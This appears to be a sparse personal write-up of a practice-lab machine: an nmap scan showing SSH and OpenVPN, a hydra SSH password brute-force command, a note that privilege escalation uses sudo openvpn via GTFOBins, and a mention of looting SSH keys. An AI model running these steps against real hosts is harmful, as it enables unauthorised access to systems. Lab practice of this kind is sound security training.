# VPN .122 \[L, Pwned]



## Enumeration

IP range: 192.168.110.122

Computer name:

```
Nmap scan report for 192.168.231.122
Host is up (0.060s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:f9:e1:44:6a:40:bc:90:e0:3f:1d:d8:86:bc:a9:3d (ECDSA)
|_  256 24:97:84:f2:58:53:7b:a3:f7:40:e9:ad:3d:12:1e:c7 (ED25519)
1194/tcp open  openvpn?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Ports

Port specific enumeration&#x20;

### Local Users

## Initial Foothold

hydra -l offsec -P 500-worst-passwords.txt ssh://192.168.142.122

Crazy cus you would think some info is there to help w this but nah

## PrivEsc

sudo openvpn GTFOBins

## Post Exploitation

SSH keys for user mario
